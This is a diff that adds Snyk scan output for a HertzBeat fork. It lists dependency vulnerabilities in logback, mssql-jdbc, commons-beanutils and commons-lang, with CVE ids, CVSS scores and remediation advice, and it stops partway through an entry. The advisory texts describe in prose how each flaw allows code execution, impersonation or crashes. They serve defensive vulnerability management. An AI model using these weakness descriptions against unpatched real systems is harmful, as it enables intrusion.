@@ -1,0 +1,1681 @@
+[
+  {
+    "vulnerabilities": [],
+    "ok": true,
+    "dependencyCount": 2,
+    "org": "alex.baker",
+    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
+    "isPrivate": true,
+    "licensesPolicy": {
+      "severities": {},
+      "orgLicenseRules": {
+        "AGPL-1.0": {
+          "licenseType": "AGPL-1.0",
+          "severity": "high",
+          "instructions": ""
+        },
+        "AGPL-3.0": {
+          "licenseType": "AGPL-3.0",
+          "severity": "high",
+          "instructions": ""
+        },
+        "Artistic-1.0": {
+          "licenseType": "Artistic-1.0",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "Artistic-2.0": {
+          "licenseType": "Artistic-2.0",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "CDDL-1.0": {
+          "licenseType": "CDDL-1.0",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "CPOL-1.02": {
+          "licenseType": "CPOL-1.02",
+          "severity": "high",
+          "instructions": ""
+        },
+        "EPL-1.0": {
+          "licenseType": "EPL-1.0",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "GPL-2.0": {
+          "licenseType": "GPL-2.0",
+          "severity": "high",
+          "instructions": ""
+        },
+        "GPL-3.0": {
+          "licenseType": "GPL-3.0",
+          "severity": "high",
+          "instructions": ""
+        },
+        "LGPL-2.0": {
+          "licenseType": "LGPL-2.0",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "LGPL-2.1": {
+          "licenseType": "LGPL-2.1",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "LGPL-3.0": {
+          "licenseType": "LGPL-3.0",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "MPL-1.1": {
+          "licenseType": "MPL-1.1",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "MPL-2.0": {
+          "licenseType": "MPL-2.0",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "MS-RL": {
+          "licenseType": "MS-RL",
+          "severity": "medium",
+          "instructions": ""
+        },
+        "SimPL-2.0": {
+          "licenseType": "SimPL-2.0",
+          "severity": "high",
+          "instructions": ""
+        }
+      }
+    },
+    "packageManager": "maven",
+    "ignoreSettings": {
+      "adminOnly": false,
+      "reasonRequired": false,
+      "disregardFilesystemIgnores": false
+    },
+    "summary": "No known vulnerabilities",
+    "filesystemPolicy": false,
+    "uniqueCount": 0,
+    "projectName": "org.apache.hertzbeat:hertzbeat",
+    "foundProjectCount": 31,
+    "displayTargetFile": "pom.xml",
+    "hasUnknownVersions": false,
+    "path": "/home/ubuntu/repos/hertzbeat-fork"
+  },
+  {
+    "vulnerabilities": [
+      {
+        "id": "SNYK-JAVA-CHQOSLOGBACK-13169722",
+        "title": "External Initialization of Trusted Variables or Data Stores",
+        "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:L",
+        "credit": [
+          "Unknown"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,1.3.16)",
+            "[1.4.0,1.5.19)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "1.3.16",
+          "1.5.19"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "medium",
+        "cvssScore": 5.9,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "ch.qos.logback:logback-core",
+        "references": [
+          {
+            "url": "https://github.com/qos-ch/logback/commit/61f6a2544f36b3016e0efd434ee21f19269f1df7",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://logback.qos.ch/news.html%231.3.16",
+            "title": "Release Notes"
+          },
+          {
+            "url": "https://logback.qos.ch/news.html%231.5.19",
+            "title": "Release Notes"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:L",
+            "cvssV3BaseScore": 6.4,
+            "modificationTime": "2025-10-04T19:43:14.046068Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:H/UI:P/VC:H/VI:L/VA:L/SC:H/SI:L/SA:L",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 5.9,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-01-29T11:58:51.094887Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:L",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 6.4,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-01-29T11:58:51.094887Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:L/A:L",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 6.4,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-10-04T19:43:14.046068Z"
+          }
+        ],
+        "description": "## Overview\n[ch.qos.logback:logback-core](https://mvnrepository.com/artifact/ch.qos.logback/logback-core) is a logback-core module.\n\nAffected versions of this package are vulnerable to External Initialization of Trusted Variables or Data Stores via the conditional processing of the `logback.xml` configuration file when both the Janino library and Spring Framework are present on the class path. An attacker can execute arbitrary code by compromising an existing configuration file or injecting a malicious environment variable before program execution. This is only exploitable if the attacker has write access to a configuration file or can set a malicious environment variable.\n## Remediation\nUpgrade `ch.qos.logback:logback-core` to version 1.3.16, 1.5.19 or higher.\n## References\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/61f6a2544f36b3016e0efd434ee21f19269f1df7)\n- [Release Notes](https://logback.qos.ch/news.html#1.3.16)\n- [Release Notes](https://logback.qos.ch/news.html#1.5.19)\n",
+        "epssDetails": {
+          "percentile": "0.18148",
+          "probability": "0.00058",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2025-11226"
+          ],
+          "CWE": [
+            "CWE-454"
+          ]
+        },
+        "packageName": "ch.qos.logback:logback-core",
+        "proprietary": false,
+        "creationTime": "2025-10-01T12:16:51.884016Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2025-10-01T07:46:31Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "ch.qos.logback",
+          "artifactId": "logback-core"
+        },
+        "publicationTime": "2025-10-01T12:16:52.127237Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-01-29T11:58:51.094887Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "medium",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.springframework.ai:spring-ai-starter-mcp-server-webmvc@1.1.1",
+          "org.springframework.boot:spring-boot-starter@3.4.2",
+          "org.springframework.boot:spring-boot-starter-logging@3.4.2",
+          "ch.qos.logback:logback-classic@1.5.16",
+          "ch.qos.logback:logback-core@1.5.16"
+        ],
+        "upgradePath": [
+          false,
+          "org.springframework.ai:spring-ai-starter-mcp-server-webmvc@1.1.1",
+          "org.springframework.boot:spring-boot-starter@3.5.8",
+          "org.springframework.boot:spring-boot-starter-logging@3.5.8",
+          "ch.qos.logback:logback-classic@1.5.21",
+          "ch.qos.logback:logback-core@1.5.21"
+        ],
+        "isUpgradable": true,
+        "isPatchable": false,
+        "name": "ch.qos.logback:logback-core",
+        "version": "1.5.16"
+      },
+      {
+        "id": "SNYK-JAVA-CHQOSLOGBACK-15062482",
+        "title": "External Initialization of Trusted Variables or Data Stores",
+        "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:L/A:L",
+        "credit": [
+          "Unknown"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[0.9.20,1.5.25)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "1.5.25"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "low",
+        "cvssScore": 1.8,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "ch.qos.logback:logback-core",
+        "references": [
+          {
+            "url": "https://github.com/qos-ch/logback/commit/1f97ae1844b1be8486e4e9cade98d7123d3eded5",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/qos-ch/logback/issues/997",
+            "title": "GitHub Issue"
+          },
+          {
+            "url": "https://logback.qos.ch/news.html%231.5.25",
+            "title": "Logback Release Notes"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:L/A:L",
+            "cvssV3BaseScore": 5,
+            "modificationTime": "2026-01-28T05:31:39.476371Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:L/AC:H/AT:P/PR:H/UI:N/VC:L/VI:L/VA:L/SC:L/SI:L/SA:L",
+            "assigner": "Snyk",
+            "severity": "low",
+            "baseScore": 1.8,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-01-23T09:52:29.498274Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:L/A:L",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-01-23T09:52:29.498274Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:L/A:L",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-01-28T05:31:39.476371Z"
+          }
+        ],
+        "description": "## Overview\n[ch.qos.logback:logback-core](https://mvnrepository.com/artifact/ch.qos.logback/logback-core) is a logback-core module.\n\nAffected versions of this package are vulnerable to External Initialization of Trusted Variables or Data Stores during the configuration file processing. An attacker can instantiate arbitrary classes already present on the class path by compromising an existing configuration file.\n## Remediation\nUpgrade `ch.qos.logback:logback-core` to version 1.5.25 or higher.\n## References\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/1f97ae1844b1be8486e4e9cade98d7123d3eded5)\n- [GitHub Issue](https://github.com/qos-ch/logback/issues/997)\n- [Logback Release Notes](https://logback.qos.ch/news.html#1.5.25)\n",
+        "epssDetails": {
+          "percentile": "0.01138",
+          "probability": "0.00011",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-1225"
+          ],
+          "CWE": [
+            "CWE-454"
+          ],
+          "GHSA": [
+            "GHSA-qqpg-mvqg-649v"
+          ]
+        },
+        "packageName": "ch.qos.logback:logback-core",
+        "proprietary": false,
+        "creationTime": "2026-01-23T09:34:22.083696Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-01-22T12:31:22Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "ch.qos.logback",
+          "artifactId": "logback-core"
+        },
+        "publicationTime": "2026-01-23T09:34:22.297320Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-01-28T05:31:39.476371Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "low",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.springframework.ai:spring-ai-starter-mcp-server-webmvc@1.1.1",
+          "org.springframework.boot:spring-boot-starter@3.4.2",
+          "org.springframework.boot:spring-boot-starter-logging@3.4.2",
+          "ch.qos.logback:logback-classic@1.5.16",
+          "ch.qos.logback:logback-core@1.5.16"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "name": "ch.qos.logback:logback-core",
+        "version": "1.5.16"
+      },
+      {
+        "id": "SNYK-JAVA-COMMICROSOFTSQLSERVER-13821835",
+        "title": "Improper Validation of Certificate with Host Mismatch",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+        "credit": [
+          "Nikita Markevich"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,10.2.4.jre8)",
+            "[11.1.0.jre11-preview, 11.2.4.jre8)",
+            "[12.1.0.jre11-preview, 12.2.1.jre8)",
+            "[12.3.0.jre11-preview, 12.4.3.jre8)",
+            "[12.5.0.jre11-preview, 12.6.5.jre8)",
+            "[12.7.0.jre11-preview, 12.8.2.jre8)",
+            "[12.9.0.jre11-preview, 12.10.2.jre8)",
+            "[13.1.0.jre8-preview, 13.2.1.jre8)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "10.2.4.jre8",
+          "11.2.4.jre8",
+          "12.2.1.jre8",
+          "12.4.3.jre8",
+          "12.6.5.jre8",
+          "12.8.2.jre8",
+          "12.10.2.jre8",
+          "13.2.1.jre8"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "high",
+        "cvssScore": 8.6,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "com.microsoft.sqlserver:mssql-jdbc",
+        "references": [
+          {
+            "url": "https://github.com/microsoft/mssql-jdbc/blob/main/CHANGELOG.md",
+            "title": "GitHub ChangeLog"
+          },
+          {
+            "url": "https://github.com/microsoft/mssql-jdbc/pull/2798",
+            "title": "GitHub PR"
+          },
+          {
+            "url": "https://github.com/microsoft/mssql-jdbc/pull/2800",
+            "title": "GitHub PR"
+          },
+          {
+            "url": "https://github.com/microsoft/mssql-jdbc/pull/2801",
+            "title": "GitHub PR"
+          },
+          {
+            "url": "https://github.com/microsoft/mssql-jdbc/pull/2802",
+            "title": "GitHub PR"
+          },
+          {
+            "url": "https://github.com/microsoft/mssql-jdbc/pull/2803",
+            "title": "GitHub PR"
+          },
+          {
+            "url": "https://github.com/microsoft/mssql-jdbc/pull/2807",
+            "title": "GitHub PR"
+          },
+          {
+            "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59250",
+            "title": "MSRC"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "NVD",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+            "cvssV3BaseScore": 8.1,
+            "modificationTime": "2025-10-15T01:14:12.432259Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.6,
+            "cvssVersion": "4.0",
+            "modificationTime": "2025-11-04T10:56:36.151540Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.1,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-11-04T10:56:36.151540Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+            "assigner": "NVD",
+            "severity": "high",
+            "baseScore": 8.1,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-10-15T01:14:12.432259Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Validation of Certificate with Host Mismatch via the `parseCommonName()` method . An attacker can gain unauthorized access or impersonate users by crafting malicious X.509 certificates that bypass hostname validation through embedding of fake hostnames within other certificate attributes.\n## Remediation\nUpgrade `com.microsoft.sqlserver:mssql-jdbc` to version 10.2.4.jre8, 11.2.4.jre8, 12.2.1.jre8, 12.4.3.jre8, 12.6.5.jre8, 12.8.2.jre8, 12.10.2.jre8, 13.2.1.jre8 or higher.\n## References\n- [GitHub ChangeLog](https://github.com/microsoft/mssql-jdbc/blob/main/CHANGELOG.md)\n- [GitHub PR](https://github.com/microsoft/mssql-jdbc/pull/2798)\n- [GitHub PR](https://github.com/microsoft/mssql-jdbc/pull/2800)\n- [GitHub PR](https://github.com/microsoft/mssql-jdbc/pull/2801)\n- [GitHub PR](https://github.com/microsoft/mssql-jdbc/pull/2802)\n- [GitHub PR](https://github.com/microsoft/mssql-jdbc/pull/2803)\n- [GitHub PR](https://github.com/microsoft/mssql-jdbc/pull/2807)\n- [MSRC](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59250)\n",
+        "epssDetails": {
+          "percentile": "0.35258",
+          "probability": "0.00145",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2025-59250"
+          ],
+          "CWE": [
+            "CWE-297"
+          ],
+          "GHSA": [
+            "GHSA-m494-w24q-6f7w"
+          ]
+        },
+        "packageName": "com.microsoft.sqlserver:mssql-jdbc",
+        "proprietary": false,
+        "creationTime": "2025-11-03T16:36:40.232361Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2025-10-14T18:30:35Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "com.microsoft.sqlserver",
+          "artifactId": "mssql-jdbc"
+        },
+        "publicationTime": "2025-11-04T10:56:36.143282Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2025-11-04T10:56:36.151540Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "high",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-manager@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-collector-collector@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-collector-basic@2.0-SNAPSHOT",
+          "com.microsoft.sqlserver:mssql-jdbc@10.2.0.jre8"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "name": "com.microsoft.sqlserver:mssql-jdbc",
+        "version": "10.2.0.jre8"
+      },
+      {
+        "id": "SNYK-JAVA-COMMONSBEANUTILS-10259368",
+        "title": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "credit": [
+          "Muthukumar Marikani"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[1.0,1.11.0)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "1.11.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "high",
+        "cvssScore": 8.7,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "commons-beanutils:commons-beanutils",
+        "references": [
+          {
+            "url": "https://lists.apache.org/thread/s0hb3jkfj5f3ryx6c57zqtfohb0of1g9",
+            "title": "Apache Advisory"
+          },
+          {
+            "url": "https://github.com/apache/commons-beanutils/commit/28ad955a1613ed5885870cc7da52093c1ce739dc",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/apache/commons-beanutils/commit/bd20740da25b69552ddef8523beec0837297eaf9",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+            "cvssV3BaseScore": 8.8,
+            "modificationTime": "2025-06-30T13:33:20.758717Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+            "cvssV3BaseScore": 8.8,
+            "modificationTime": "2025-06-05T11:01:42.291949Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.7,
+            "cvssVersion": "4.0",
+            "modificationTime": "2025-05-29T07:17:22.606442Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.8,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-05-29T07:17:22.606442Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+            "assigner": "Red Hat",
+            "severity": "high",
+            "baseScore": 8.8,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-06-30T13:33:20.758717Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+            "assigner": "SUSE",
+            "severity": "high",
+            "baseScore": 8.8,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-06-05T11:01:42.291949Z"
+          }
+        ],
+        "description": "## Overview\n[commons-beanutils:commons-beanutils](https://mvnrepository.com/artifact/commons-beanutils/commons-beanutils) is a provides an easy-to-use but flexible wrapper around reflection and introspection.\n\nAffected versions of this package are vulnerable to Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection') via the `getProperty` and `getNestedProperty` methods of the `PropertyUtilsBean` class. An attacker can execute arbitrary code by accessing the `declaredClass` property of Java enum objects, which allows access to the ClassLoader.\r\n\r\n**Note:**\r\n\r\nThe `BeanIntrospector` class that can mitigate this vulnerability was added in version 1.9.2 but its usage was not enabled by default.\n## Remediation\nUpgrade `commons-beanutils:commons-beanutils` to version 1.11.0 or higher.\n## References\n- [Apache Advisory](https://lists.apache.org/thread/s0hb3jkfj5f3ryx6c57zqtfohb0of1g9)\n- [GitHub Commit](https://github.com/apache/commons-beanutils/commit/28ad955a1613ed5885870cc7da52093c1ce739dc)\n- [GitHub Commit](https://github.com/apache/commons-beanutils/commit/bd20740da25b69552ddef8523beec0837297eaf9)\n",
+        "epssDetails": {
+          "percentile": "0.28767",
+          "probability": "0.00104",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2025-48734"
+          ],
+          "CWE": [
+            "CWE-470"
+          ],
+          "GHSA": [
+            "GHSA-wxr5-93ph-8wr9"
+          ]
+        },
+        "packageName": "commons-beanutils:commons-beanutils",
+        "proprietary": false,
+        "creationTime": "2025-05-29T06:53:21.740594Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2025-05-28T15:34:34Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "commons-beanutils",
+          "artifactId": "commons-beanutils"
+        },
+        "publicationTime": "2025-05-29T07:17:22.599241Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2025-06-30T13:33:20.758717Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "high",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-manager@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-collector-collector@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-collector-rocketmq@2.0-SNAPSHOT",
+          "org.apache.rocketmq:rocketmq-tools@4.9.4",
+          "org.apache.rocketmq:rocketmq-acl@4.9.4",
+          "commons-validator:commons-validator@1.7",
+          "commons-beanutils:commons-beanutils@1.9.4"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "name": "commons-beanutils:commons-beanutils",
+        "version": "1.9.4"
+      },
+      {
+        "id": "SNYK-JAVA-COMMONSLANG-10734077",
+        "title": "Uncontrolled Recursion",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+        "credit": [
+          "Unknown"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[2.0,]"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "java",
+        "severity": "high",
+        "cvssScore": 8.8,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "commons-lang:commons-lang",
+        "references": [
+          {
+            "url": "https://lists.apache.org/thread/bgv0lpswokgol11tloxnjfzdl7yrc1g1",
+            "title": "Apache Pony Mail"
+          },
+          {
+            "url": "https://github.com/apache/commons-lang/commit/b424803abdb2bec818e4fbcb251ce031c22aca53",
+            "title": "GitHub Commit"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "low",
+            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "cvssV3BaseScore": 3.7,
+            "modificationTime": "2025-07-12T06:33:52.830274Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:H",
+            "cvssV3BaseScore": 4.7,
+            "modificationTime": "2025-08-14T11:02:13.905724Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.8,
+            "cvssVersion": "4.0",
+            "modificationTime": "2025-07-13T09:08:38.850906Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 8.2,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-07-13T09:08:38.850906Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "assigner": "Red Hat",
+            "severity": "low",
+            "baseScore": 3.7,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-07-12T06:33:52.830274Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:H",
+            "assigner": "SUSE",
+            "severity": "medium",
+            "baseScore": 4.7,
+            "cvssVersion": "3.1",
+            "modificationTime": "2025-08-14T11:02:13.905724Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Uncontrolled Recursion via the `ClassUtils.getClass` function. An attacker can cause the application to terminate unexpectedly by providing excessively long input values.\n## Remediation\nThere is no fixed version for `commons-lang:commons-lang`.\n\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/bgv0lpswokgol11tloxnjfzdl7yrc1g1)\n- [GitHub Commit](https://github.com/apache/commons-lang/commit/b424803abdb2bec818e4fbcb251ce031c22aca53)\n",
+        "epssDetails": {
+          "percentile": "0.05144",
+          "probability": "0.00022",
+          "modelVersion": "v2025.03.14"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2025-48924"
+          ],
+          "CWE": [
+            "CWE-674"
+          ],
+          "GHSA": [
+            "GHSA-j288-q9x7-2f5v"
+          ]
+        },
+        "packageName": "commons-lang:commons-lang",
+        "proprietary": false,
+        "creationTime": "2025-07-13T07:58:52.379649Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2025-07-11T15:31:37Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "maven",
+        "mavenModuleName": {
+          "groupId": "commons-lang",
+          "artifactId": "commons-lang"
+        },
+        "publicationTime": "2025-07-13T09:08:38.513212Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2025-08-14T11:02:13.905724Z",
+        "socialTrendAlert": false,
+        "severityWithCritical": "high",
+        "from": [
+          "org.apache.hertzbeat:hertzbeat-ai@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-manager@2.0-SNAPSHOT",
+          "org.apache.hertzbeat:hertzbeat-collector-collector@2.0-SNAPSHOT",
